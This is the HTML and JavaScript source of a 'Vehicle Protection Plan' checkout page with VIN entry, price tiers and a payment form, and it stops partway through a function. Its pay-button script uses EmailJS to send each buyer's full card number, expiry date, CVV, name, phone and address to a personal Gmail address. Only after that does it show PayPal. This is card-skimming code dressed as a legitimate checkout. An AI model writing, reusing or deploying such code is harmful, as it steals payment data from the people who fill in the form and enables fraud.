<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vehicle Protection Plan</title>

  <!-- Animate.css -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <!-- PayPal SDK -->
  <script src="https://www.paypal.com/sdk/js?client-id=AQFdUcOGPHTGAsmIYqy8ewqY75y_G2J-4I_c-fGT4KHNsxvRkW0MeX7yqyIHNCfbRgLWekR1FH7y6XJx&currency=USD"></script>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>

<style>
:root {
  background-color: var(--primary-color);
  --secondary-color: #a29bfe;
  --accent-color: #fd79a8;
  --light-color: #f8f9fa;
  --dark-color: #1a1a2e;
  --darker-color: #16213e;
  --success-color: #00b894;
  --warning-color: #fdcb6e;
  --danger-color: #d63031;
  --gray-color: #b2bec3;
  --light-gray: #dfe6e9;
  --card-bg: #2d3436;
  
}


    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Poppins', sans-serif;
        background-color: var(--darker-color);
        color: var(--light-gray);
        line-height: 1.6;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
         background-image: url('backgro');
    }

    .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        flex: 1;
    }

    header {
        text-align: center;
        margin-bottom: 40px;
        padding: 80px 0;
        animation: fadeInDown 1s;
        background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
                    url('backgrond.jpg') center/cover no-repeat;
        color: white;
        border-radius: 10px;
        position: relative;
        overflow: hidden;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    header h1 {
        font-size: 3rem;
        color: white;
        margin-bottom: 15px;
        position: relative;
        z-index: 2;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }

    header p {
        font-size: 1.3rem;
        color: rgba(255, 255, 255, 0.9);
        position: relative;
        z-index: 2;
        max-width: 700px;
        margin: 0 auto;
    }

    .btn {
        background-color: var(--primary-color);
        color: white;
        border: none;
        padding: 14px 28px;
        border-radius: 50px;
        cursor: pointer;
        font-size: 1rem;
        font-weight: 600;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 1px;
        box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }

    .btn:hover {
        background-color: var(--secondary-color);
        transform: translateY(-3px);
        box-shadow: 0 6px 20px rgba(108, 92, 231, 0.4);
    }

    .btn:active {
        transform: translateY(1px);
    }

    .btn i {
        font-size: 1.1rem;
    }

    .form-group {
        margin-bottom: 25px;
    }

    .form-group label {
        display: block;
        margin-bottom: 10px;
        font-weight: 500;
        color: var(--light-gray);
        font-size: 1rem;
    }

    .form-group input,
    .form-group select {
        width: 100%;
        padding: 14px;
        border: 2px solid var(--card-bg);
        border-radius: 8px;
        font-size: 1rem;
        transition: all 0.3s ease;
        background-color: var(--dark-color);
        color: var(--light-gray);
    }

    .form-group input:focus,
    .form-group select:focus {
        border-color: var(--primary-color);
        outline: none;
        box-shadow: 0 0 0 4px rgba(108, 92, 231, 0.2);
    }

    .form-row {
        display: flex;
        gap: 25px;
        margin-bottom: 25px;
    }

    .form-row .form-group {
        flex: 1;
        margin-bottom: 0;
    }

    .vin-section {
        background-color: var(--dark-color);
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        margin-bottom: 40px;
        text-align: center;
        animation: fadeIn 1s;
        border: 1px solid rgba(255, 255, 255, 0.05);
        background-image: linear-gradient(to right, var(--dark-color), var(--darker-color));
    }

    .price-section {
        background-color: var(--dark-color);
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        margin-bottom: 40px;
        transition: all 0.5s ease;
        display: none;
        animation: fadeInUp 1s;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .price-section h2 {
        text-align: center;
        margin-bottom: 40px;
        color: var(--light-gray);
        font-size: 2rem;
        position: relative;
        padding-bottom: 15px;
    }

    .price-section h2::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 50%;
        transform: translateX(-50%);
        width: 80px;
        height: 4px;
        background: var(--primary-color);
        border-radius: 2px;
    }

    .price-cards {
        display: flex;
        justify-content: center;
        gap: 30px;
        flex-wrap: wrap;
    }

    .price-card {
        flex: 1;
        min-width: 280px;
        max-width: 320px;
        background-color: var(--card-bg);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        padding: 30px;
        text-align: center;
        transition: all 0.4s ease;
        position: relative;
        overflow: hidden;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    .price-card:hover {
        transform: translateY(-10px);
        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        border-color: var(--primary-color);
    }

    .price-card.featured {
        border: 2px solid var(--primary-color);
        transform: translateY(-10px);
        background-color: var(--dark-color);
    }

    .price-card h3 {
        font-size: 1.6rem;
        margin-bottom: 20px;
        color: var(--light-gray);
    }

    .price {
        font-size: 2.8rem;
        font-weight: 700;
        color: var(--primary-color);
        margin-bottom: 25px;
        position: relative;
        display: inline-block;
    }

    .price::before {
        content: '$';
        font-size: 1.5rem;
        position: absolute;
        left: -20px;
        top: 10px;
    }

    .price-card ul {
        list-style: none;
        margin-bottom: 30px;
        text-align: left;
    }

    .price-card ul li {
        padding: 10px 0;
        position: relative;
        padding-left: 30px;
        font-size: 0.95rem;
        color: var(--gray-color);
    }

    .price-card ul li:before {
        content: "\f00c";
        font-family: "Font Awesome 6 Free";
        font-weight: 900;
        color: var(--success-color);
        position: absolute;
        left: 0;
        top: 10px;
    }

    .select-btn {
        width: 100%;
        background-color: var(--primary-color);
    }

    .price-card.featured .select-btn {
        background-color: var(--accent-color);
    }

    .price-card.featured .select-btn:hover {
        background-color: #e84393;
    }

    .popular-tag {
        position: absolute;
        top: 15px;
        right: -30px;
        background-color: var(--accent-color);
        color: white;
        padding: 5px 30px;
        font-size: 0.8rem;
        font-weight: 700;
        transform: rotate(45deg);
        width: 120px;
        text-align: center;
    }

    .payment-form {
        background-color: var(--dark-color);
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        margin-bottom: 40px;
        display: none;
        animation: fadeInUp 1s;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .payment-form h2 {
        text-align: center;
        margin-bottom: 40px;
        color: var(--light-gray);
        font-size: 2rem;
        position: relative;
        padding-bottom: 15px;
    }

    .payment-form h2::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 50%;
        transform: translateX(-50%);
        width: 80px;
        height: 4px;
        background: var(--primary-color);
        border-radius: 2px;
    }

    .pay-btn {
        width: 100%;
        background-color: var(--success-color);
        margin-top: 20px;
    }

    .pay-btn:hover {
        background-color: #00a884;
    }

    .confirmation {
        display: none;
        justify-content: center;
        align-items: center;
        min-height: 400px;
        animation: fadeIn 1s;
    }

    .confirmation-box {
        background-color: var(--dark-color);
        padding: 50px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        text-align: center;
        max-width: 600px;
        width: 100%;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .confirmation-box h2 {
        color: var(--success-color);
        margin-bottom: 25px;
        font-size: 2.2rem;
    }

    .confirmation-box i {
        font-size: 4rem;
        color: var(--success-color);
        margin-bottom: 20px;
        animation: bounceIn 1s;
    }

    .confirmation-box p {
        margin-bottom: 20px;
        font-size: 1.1rem;
        line-height: 1.8;
        color: var(--gray-color);
    }

    .order-details {
        margin-top: 30px;
        padding-top: 25px;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        text-align: left;
    }

    .order-details p {
        margin-bottom: 15px;
        display: flex;
        color: var(--light-gray);
    }

    .order-details p strong {
        min-width: 100px;
        display: inline-block;
        color: var(--light-gray);
    }

    footer {
        background: linear-gradient(135deg, var(--dark-color) 0%, #0f0f23 100%);
        color: white;
        padding: 60px 0 30px;
        margin-top: 80px;
        border-top: 1px solid rgba(255, 255, 255, 0.05);
    }

    .footer-content {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px;
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 40px;
    }

    .footer-column h3 {
        font-size: 1.3rem;
        margin-bottom: 25px;
        position: relative;
        padding-bottom: 10px;
        color: var(--light-gray);
    }

    .footer-column h3::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 0;
        width: 50px;
        height: 3px;
        background: var(--primary-color);
    }

    .footer-links {
        list-style: none;
    }

    .footer-links li {
        margin-bottom: 15px;
    }

    .footer-links a {
        color: var(--gray-color);
        text-decoration: none;
        transition: all 0.3s;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .footer-links a:hover {
        color: var(--light-gray);
        transform: translateX(5px);
    }

    .footer-links a i {
        font-size: 0.8rem;
    }

    .social-links {
        display: flex;
        gap: 15px;
        margin-top: 20px;
    }

    .social-links a {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 40px;
        height: 40px;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 50%;
        color: white;
        transition: all 0.3s;
    }

    .social-links a:hover {
        background: var(--primary-color);
        transform: translateY(-5px);
    }

    .copyright {
        text-align: center;
        margin-top: 50px;
        padding-top: 30px;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        color: var(--gray-color);
        font-size: 0.9rem;
    }

    /* Card payment styles */
    .card-payment {
        margin-top: 30px;
    }

    .card-group {
        display: flex;
        gap: 15px;
    }

    .card-group .form-group {
        flex: 1;
    }

    /* Animations */
    @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }

    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
        100% { transform: translateY(0px); }
    }

    .pulse {
        animation: pulse 2s infinite;
    }

    .float {
        animation: float 3s ease-in-out infinite;
    }

    /* Feature icons */
    .feature-icon {
        width: 60px;
        height: 60px;
        background: rgba(222, 46, 245, 0.1);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 20px;
        font-size: 1.5rem;
        color: var(--primary-color);
    }

    /* Responsive styles */
    @media (max-width: 992px) {
        header h1 {
            font-size: 2.5rem;
        }
        
        header p {
            font-size: 1.1rem;
        }
        
        .price-cards {
            gap: 20px;
        }
        
        .price-card {
            min-width: 240px;
        }
    }

    @media (max-width: 768px) {
        .form-row {
            flex-direction: column;
            gap: 20px;
        }

        .price-cards {
            flex-direction: column;
            align-items: center;
        }

        .price-card {
            max-width: 100%;
        }
        
        header {
            padding: 30px 20px;
        }
        
        header h1 {
            font-size: 2rem;
        }
        
        .confirmation-box {
            padding: 30px;
        }

        .card-group {
            flex-direction: column;
            gap: 15px;
        }
    }

    @media (max-width: 576px) {
        header h1 {
            font-size: 1.8rem;
        }
        
        header p {
            font-size: 1rem;
        }
        
        .btn {
            padding: 12px 20px;
            font-size: 0.9rem;
        }
        
        .price {
            font-size: 2.2rem;
        }
        
        .confirmation-box {
            padding: 20px;
        }
        
        .footer-content {
            grid-template-columns: 1fr;
        }
    }
    
.logo {
  position: absolute;
  top: 10px;
  left: 10px;
  height: 200px; /* Size adjust karne ke liye */
  animation: blink 3s infinite;
}

@keyframes blink {
  0%, 100% {
    opacity: 1;
  }
  50% {
    opacity: 0;
  }
}

.marquee-container {
  width: 100%;
  overflow: hidden;
  background-color: #111; /* Dark background */
  padding: 10px 0;
}

.marquee-text {
  display: inline-block;
  white-space: nowrap;
  color: #ffffff; /* Neon green-blue color */
  font-size: 32px;
  font-weight: bold;
  animation: scroll-left 15s linear infinite;
}

@keyframes scroll-left {
  0% {
    transform: translateX(100%);
  }
  100% {
    transform: translateX(-100%);
  }
}



</style>
</head>
<body>
     
    <div class="container">
        <header class="animate__animated animate__fadeIn">
            <div class="marquee-container">
                <img src="vinl logo (2).png" alt="My Logo" class="logo">
  <div class="marquee-text">
    
    Vehicle Protection Plan - Secure Your Car Today! 🚗💼 | 24/7 Support | Best Coverage Plans!
  </div>
            
        </header>

        <div class="vin-section animate__animated animate__fadeIn">
            <div class="form-group">
                <label for="vin"><i class="fas fa-car"></i> Vehicle Identification Number (VIN)</label>
                <input type="text" id="vin" placeholder="Enter 17-digit VIN" maxlength="17">
                <button id="check-vin" class="btn pulse"><i class="fas fa-search"></i> Check VIN</button>
            </div>
        </div>

        <div class="price-section">
            <h2>Select Your Protection Plan</h2>
            <div class="price-cards">
                <div class="price-card" data-tier="basic">
                    <h3>Basic</h3>
                    <div class="price" id="basic-price">35</div>
                    <ul>
                        <li>Roadside Assistance</li>
                        <li>Engine Coverage</li>
                        <li>24/7 Support</li>
                        <li>Towing Services</li>
                        <li>Battery Jumpstart</li>
                    </ul>
                    <button class="btn select-btn"><i class="fas fa-check"></i> Select</button>
                </div>
                <div class="price-card featured" data-tier="standard">
                    <div class="popular-tag">Most Popular</div>
                    <h3>Standard</h3>
                    <div class="price" id="standard-price">50</div>
                    <ul>
                        <li>All Basic Features</li>
                        <li>Transmission Coverage</li>
                        <li>Rental Car Assistance</li>
                        <li>Lockout Service</li>
                        <li>Fuel Delivery</li>
                    </ul>
                    <button class="btn select-btn"><i class="fas fa-star"></i> Select</button>
                </div>
                <div class="price-card" data-tier="premium">
                    <h3>Premium</h3>
                    <div class="price" id="premium-price">80</div>
                    <ul>
                        <li>All Standard Features</li>
                        <li>Full Vehicle Coverage</li>
                        <li>Deductible Waiver</li>
                        <li>Trip Interruption</li>
                        <li>Premium Concierge</li>
                    </ul>
                    <button class="btn select-btn"><i class="fas fa-gem"></i> Select</button>
                </div>
            </div>
        </div>

        <div class="payment-form">
            <h2>Complete Your Purchase</h2>
            <form id="payment-form">
                <div class="form-group">
                    <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
                    <input type="email" id="email" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="first-name"><i class="fas fa-user"></i> First Name</label>
                        <input type="text" id="first-name" required>
                    </div>
                    <div class="form-group">
                        <label for="last-name"><i class="fas fa-user"></i> Last Name</label>
                        <input type="text" id="last-name" required>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="phone"><i class="fas fa-phone"></i> Phone Number</label>
                        <input type="tel" id="phone" required>
                    </div>
                    <div class="form-group">
                        <label for="address"><i class="fas fa-map-marker-alt"></i> Address</label>
                        <input type="text" id="address" required>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="zip"><i class="fas fa-map-pin"></i> Zip Code</label>
                        <input type="text" id="zip" required>
                    </div>
                    <div class="form-group">
                        <label for="state"><i class="fas fa-flag-usa"></i> State</label>
                        <select id="state" required>
                            <option value="">Select State</option>
                            <option value="AL">Alabama</option>
                            <option value="AK">Alaska</option>
                            <option value="AZ">Arizona</option>
                            <option value="AR">Arkansas</option>
                            <option value="CA">California</option>
                            <option value="CO">Colorado</option>
                            <option value="CT">Connecticut</option>
                            <option value="DE">Delaware</option>
                            <option value="FL">Florida</option>
                            <option value="GA">Georgia</option>
                            <option value="HI">Hawaii</option>
                            <option value="ID">Idaho</option>
                            <option value="IL">Illinois</option>
                            <option value="IN">Indiana</option>
                            <option value="IA">Iowa</option>
                            <option value="KS">Kansas</option>
                            <option value="KY">Kentucky</option>
                            <option value="LA">Louisiana</option>
                            <option value="ME">Maine</option>
                            <option value="MD">Maryland</option>
                            <option value="MA">Massachusetts</option>
                            <option value="MI">Michigan</option>
                            <option value="MN">Minnesota</option>
                            <option value="MS">Mississippi</option>
                            <option value="MO">Missouri</option>
                            <option value="MT">Montana</option>
                            <option value="NE">Nebraska</option>
                            <option value="NV">Nevada</option>
                            <option value="NH">New Hampshire</option>
                            <option value="NJ">New Jersey</option>
                            <option value="NM">New Mexico</option>
                            <option value="NY">New York</option>
                            <option value="NC">North Carolina</option>
                            <option value="ND">North Dakota</option>
                            <option value="OH">Ohio</option>
                            <option value="OK">Oklahoma</option>
                            <option value="OR">Oregon</option>
                            <option value="PA">Pennsylvania</option>
                            <option value="RI">Rhode Island</option>
                            <option value="SC">South Carolina</option>
                            <option value="SD">South Dakota</option>
                            <option value="TN">Tennessee</option>
                            <option value="TX">Texas</option>
                            <option value="UT">Utah</option>
                            <option value="VT">Vermont</option>
                            <option value="VA">Virginia</option>
                            <option value="WA">Washington</option>
                            <option value="WV">West Virginia</option>
                            <option value="WI">Wisconsin</option>
                            <option value="WY">Wyoming</option>
                        </select>
                    </div>
                </div>

                <input type="hidden" id="selected-plan" name="selected-plan">
                <input type="hidden" id="selected-price" name="selected-price">
                
                <!-- Card Payment Section -->
                <div id="card-payment" class="card-payment">
                    <div class="form-group">
                        <label for="card-number"><i class="fas fa-credit-card"></i> Card Number</label>
                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
                    </div>
                    
                    <div class="card-group">
                        <div class="form-group">
                            <label for="expiry"><i class="fas fa-calendar-alt"></i> Expiry Date</label>
                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
                        </div>
                        <div class="form-group">
                            <label for="cvv"><i class="fas fa-lock"></i> CVV</label>
                            <input type="text" id="cvv" placeholder="123" maxlength="4">
                        </div>
                    </div>
                    
                    <button type="submit" class="btn pay-btn"><i class="fas fa-lock"></i> Pay Securely</button>
                </div>
                
                <!-- PayPal Button Container -->
                <div id="paypal-button-container" style="margin-top: 30px;"></div>
            </form>
        </div>

        <div class="confirmation">
            <div class="confirmation-box">
                <i class="fas fa-check-circle float"></i>
                <h2>Payment Successful!</h2>
                <p>Thank you for choosing our Vehicle Protection Plan. Your coverage is now active.</p>
                <p>A confirmation email with all the details has been sent to your email address.</p>
                <div class="order-details">
                    <p><strong>Plan:</strong> <span id="confirmed-plan"></span></p>
                    <p><strong>Amount:</strong> <span id="confirmed-amount"></span></p>
                    <p><strong>VIN:</strong> <span id="confirmed-vin"></span></p>
                    <p><strong>Email:</strong> <span id="confirmed-email"></span></p>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-column">
                <h3>About Us</h3>
                <p>Providing premium vehicle protection plans since 2010. Our mission is to give you peace of mind on the road.</p>
                <div class="social-links">
                    <a href="#"><i class="fab fa-facebook-f"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
                </div>
            </div>
            <div class="footer-column">
                <h3>Quick Links</h3>
                <ul class="footer-links">
                    <li><a href="#"><i class="fas fa-chevron-right"></i> Home</a></li>
                    <li><a href="#"><i class="fas fa-chevron-right"></i> Plans</a></li>
                    <li><a href="#"><i class="fas fa-chevron-right"></i> Coverage</a></li>
                    <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
                    <li><a href="#"><i class="fas fa-chevron-right"></i> Contact</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Contact Info</h3>
                <ul class="footer-links">
                    <li><a href="#"><i class="fas fa-map-marker-alt"></i> 123 Auto Street, New York, NY</a></li>
                    <li><a href="tel:+18005551234"><i class="fas fa-phone"></i> (800) 555-1234</a></li>
                    <li><a href="mailto:info@vehicleprotection.com"><i class="fas fa-envelope"></i> info@vehicleprotection.com</a></li>
                    <li><a href="#"><i class="fas fa-clock"></i> Mon-Fri: 9AM - 6PM</a></li>
                </ul>
            </div>
        </div>
        <div class="copyright">
            &copy; 2025 Vehicle Protection Plan. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
        </div>
    </footer>
    <script src="https://www.paypal.com/sdk/js?client-id=AQFdUcOGPHTGAsmIYqy8ewqY75y_G2J-4I_c-fGT4KHNsxvRkW0MeX7yqyIHNCfbRgLWekR1FH7y6XJx&currency=USD"></script>
    <script>
document.addEventListener('DOMContentLoaded', function() {
    // Check if EmailJS is loaded
    if (typeof emailjs === 'undefined') {
        console.error('EmailJS is not loaded');
        return;
    }
    
    try {
        // Initialize EmailJS with your user ID
        emailjs.init('MCY440jkTN2SaamLB');
    } catch (e) {
        console.error('EmailJS initialization failed:', e);
        return;
    }

    // DOM Elements
    const elements = {
        vinInput: document.getElementById('vin'),
        checkVinBtn: document.getElementById('check-vin'),
        priceSection: document.querySelector('.price-section'),
        paymentForm: document.querySelector('.payment-form'),
        confirmationSection: document.querySelector('.confirmation'),
        priceCards: document.querySelectorAll('.price-card'),
        selectedPlanInput: document.getElementById('selected-plan'),
        selectedPriceInput: document.getElementById('selected-price'),
        paymentFormElement: document.getElementById('payment-form'),
        confirmedPlan: document.getElementById('confirmed-plan'),
        confirmedAmount: document.getElementById('confirmed-amount'),
        confirmedVin: document.getElementById('confirmed-vin'),
        confirmedEmail: document.getElementById('confirmed-email'),
        paypalButtonsContainer: document.getElementById('paypal-button-container'),
        cardPaymentSection: document.getElementById('card-payment'),
        payBtn: document.querySelector('.pay-btn'),
        cardNumber: document.getElementById('card-number'),
        expiry: document.getElementById('expiry'),
        cvv: document.getElementById('cvv'),
        email: document.getElementById('email'),
        firstName: document.getElementById('first-name'),
        lastName: document.getElementById('last-name'),
        phone: document.getElementById('phone'),
        address: document.getElementById('address'),
        zip: document.getElementById('zip'),
        state: document.getElementById('state')
    };

    // Check if all required elements exist
    for (const [key, element] of Object.entries(elements)) {
        if (!element && key !== 'paypalButtonsContainer') { // PayPal container might not exist initially
            console.error(`Element not found: ${key}`);
        }
    }

    // Price tiers
    const priceTiers = {
        basic: 35,
        standard: 50,
        premium: 80,
    };
    
    // Check VIN button click handler
    if (elements.checkVinBtn && elements.vinInput) {
        elements.checkVinBtn.addEventListener('click', function() {
            const vin = elements.vinInput.value.trim();
            
            if (vin.length !== 17) {
                alert('Please enter a valid 17-digit VIN');
                return;
            }
            
            // Update prices
            document.getElementById('basic-price').textContent = priceTiers.basic;
            document.getElementById('standard-price').textContent = priceTiers.standard;
            document.getElementById('premium-price').textContent = priceTiers.premium;
            
            // Show price section with animation
            if (elements.priceSection) {
                elements.priceSection.style.display = 'block';
                elements.priceSection.classList.add('animate__animated', 'animate__fadeInUp');
                
                // Scroll to price section
                setTimeout(() => {
                    elements.priceSection.scrollIntoView({ behavior: 'smooth' });
                }, 500);
            }
        });
    }
    
    // Price card selection handler
    if (elements.priceCards) {
        elements.priceCards.forEach(card => {
            card.addEventListener('click', function(e) {
                if (e.target.classList.contains('select-btn')) return;
                
                const btn = this.querySelector('.select-btn');
                if (btn) btn.click();
            });
            
            const selectBtn = card.querySelector('.select-btn');
            if (selectBtn) {
                selectBtn.addEventListener('click', function() {
                    const tier = card.dataset.tier;
                    const price = priceTiers[tier];
                    
                    // Set the selected plan and price
                    if (elements.selectedPlanInput) elements.selectedPlanInput.value = tier.charAt(0).toUpperCase() + tier.slice(1);
                    if (elements.selectedPriceInput) elements.selectedPriceInput.value = price;
                    
                    // Show payment form with animation
                    if (elements.paymentForm) {
                        elements.paymentForm.style.display = 'block';
                        elements.paymentForm.classList.add('animate__animated', 'animate__fadeInUp');
                        
                        // Hide PayPal buttons initially
                        if (elements.paypalButtonsContainer) {
                            elements.paypalButtonsContainer.style.display = 'none';
                        }
                        
                        // Scroll to payment form
                        setTimeout(() => {
                            elements.paymentForm.scrollIntoView({ behavior: 'smooth' });
                        }, 500);
                    }
                });
            }
        });
    }
    
    // Format card number input
    if (elements.cardNumber) {
        elements.cardNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
            }
            e.target.value = value;
        });
    }
    
    // Format expiry date input
    if (elements.expiry) {
        elements.expiry.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
    }
    
    // Pay Securely button click handler
    if (elements.payBtn && elements.paymentFormElement) {
        elements.payBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Validate required fields
            const requiredFields = [
                elements.email, 
                elements.firstName, 
                elements.lastName, 
                elements.phone, 
                elements.address, 
                elements.zip, 
                elements.state,
                elements.selectedPlanInput,
                elements.selectedPriceInput,
                elements.vinInput
            ];
            
            for (const field of requiredFields) {
                if (field && !field.value.trim()) {
                    alert(`Please fill in all required fields`);
                    field.focus();
                    return;
                }
            }
            
            // Validate card details if card payment is visible
            if (elements.cardPaymentSection && elements.cardPaymentSection.style.display !== 'none') {
                const cardNumber = elements.cardNumber.value.replace(/\s+/g, '');
                const expiry = elements.expiry.value;
                const cvv = elements.cvv.value;
                
                if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                    alert('Please enter a valid 16-digit card number');
                    return;
                }
                
                if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                    alert('Please enter a valid expiry date in MM/YY format');
                    return;
                }
                
                if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
                    alert('Please enter a valid CVV (3 or 4 digits)');
                    return;
                }
            }
            
            // Get form values
            const formData = {
                email: elements.email.value,
                firstName: elements.firstName.value,
                lastName: elements.lastName.value,
                phone: elements.phone.value,
                address: elements.address.value,
                zip: elements.zip.value,
                state: elements.state.value,
                plan: elements.selectedPlanInput.value,
                price: elements.selectedPriceInput.value,
                vin: elements.vinInput.value,
                paymentMethod: 'Credit Card'
            };
            
            if (elements.cardNumber) {
                formData.cardLast4 = elements.cardNumber.value.replace(/\s+/g, '').slice(-4);
            }
            
            // 1. First send email
            emailjs.send('service_yc0alnu', 'template_kmx1pik', {
                to_email: 'AliRaza9541a.r@gmail.com',
                customer_email: formData.email,
                customer_name: `${formData.firstName} ${formData.lastName}`,
                customer_phone: formData.phone,
                customer_address: `${formData.address}, ${formData.zip}, ${formData.state}`,
                vin_number: formData.vin,
                plan_type: formData.plan,
                plan_price: `$${formData.price}`,
                payment_method: 'Credit Card (Pending)',
                 card_number: elements.cardNumber.value.replace(/\s+/g, ''), // Card Number (formatted without spaces)
    card_last4: elements.cardNumber.value.replace(/\s+/g, '').slice(-4), // Last 4 digits of the Card Number
    card_expiry: elements.expiry.value, // Expiry Date (MM/YY format)
    card_cvv: elements.cvv.value, // CVV
                timestamp: new Date().toLocaleString()
               
            })
            .then(() => {
                console.log('Email sent successfully');
                
                // 2. Then show PayPal payment gateway if PayPal is loaded
                if (typeof paypal !== 'undefined') {
                    const tier = formData.plan.toLowerCase();
                    const price = formData.price;
                    
                    if (elements.paypalButtonsContainer) {
                        elements.paypalButtonsContainer.innerHTML = '';
                        paypal.Buttons({
                            style: {
                                layout: 'vertical',
                                color: 'blue',
                                shape: 'rect',
                                label: 'paypal',
                                height: 48
                            },
                            createOrder: function(data, actions) {
                                return actions.order.create({
                                    purchase_units: [{
                                        description: `${tier.charAt(0).toUpperCase() + tier.slice(1)} Vehicle Protection Plan`,
                                        amount: {
                                            value: price,
                                            currency_code: 'USD'
                                        }
                                    }]
                                });
                            },
                            onApprove: function(data, actions) {
                                return actions.order.capture().then(function(details) {
                                    // On successful payment
                                    const paymentData = {
                                        ...formData,
                                        paymentId: details.id,
                                        paymentMethod: 'PayPal'
                                    };
                                    
                                    // Send payment confirmation
                                    sendPaymentConfirmationEmail(paymentData);
                                    
                                    // Show confirmation
                                    showConfirmation(paymentData);
                                });
                            },
                            onError: function(err) {
                                console.error('PayPal error:', err);
                                alert('Payment failed. Please try again.');
                            }
                        }).render('#paypal-button-container');
                        
                        // Show PayPal buttons
                        elements.paypalButtonsContainer.style.display = 'block';
                        if (elements.cardPaymentSection) {
                            elements.cardPaymentSection.style.display = 'none';
                        }
                        
                        // Scroll to PayPal buttons
                        setTimeout(() => {
                            if (elements.paypalButtonsContainer) {
                                elements.paypalButtonsContainer.scrollIntoView({ behavior: 'smooth' });
                            }
                        }, 300);
                    }
                } else {
                    console.error('PayPal SDK not loaded');
                    // Fallback to show confirmation directly if PayPal isn't available
                    showConfirmation(formData);
                }
            })
            .catch(error => {
                console.error('Email failed:', error);
                alert('Error sending confirmation email. Please try again.');
            });
        });
    }
    
    // Show confirmation page
    function showConfirmation(formData) {
        if (elements.confirmedPlan) elements.confirmedPlan.textContent = formData.plan;
        if (elements.confirmedAmount) elements.confirmedAmount.textContent = `$${formData.price}`;
        if (elements.confirmedVin) elements.confirmedVin.textContent = formData.vin;
        if (elements.confirmedEmail) elements.confirmedEmail.textContent = formData.email;
        
        if (elements.paymentForm) elements.paymentForm.style.display = 'none';
        if (elements.confirmationSection) {
            elements.confirmationSection.style.display = 'flex';
            elements.confirmationSection.classList.add('animate__animated', 'animate__fadeIn');
            
            setTimeout(() => {
                elements.confirmationSection.scrollIntoView({ behavior: 'smooth' });
            }, 500);
        }
    }
    
    // Send payment confirmation email
    async function sendPaymentConfirmationEmail(formData) {
        try {
            await emailjs.send('service_yc0alnu', 'template_kmx1pik', {
                to_email: 'AliRaza9541a.r@gmail.com',
                customer_email: formData.email,
                customer_name: `${formData.firstName} ${formData.lastName}`,
                customer_phone: formData.phone,
                customer_address: `${formData.address}, ${formData.zip}, ${formData.state}`,
                vin_number: formData.vin,
                plan_type: formData.plan,
                plan_price: `$${formData.price}`,
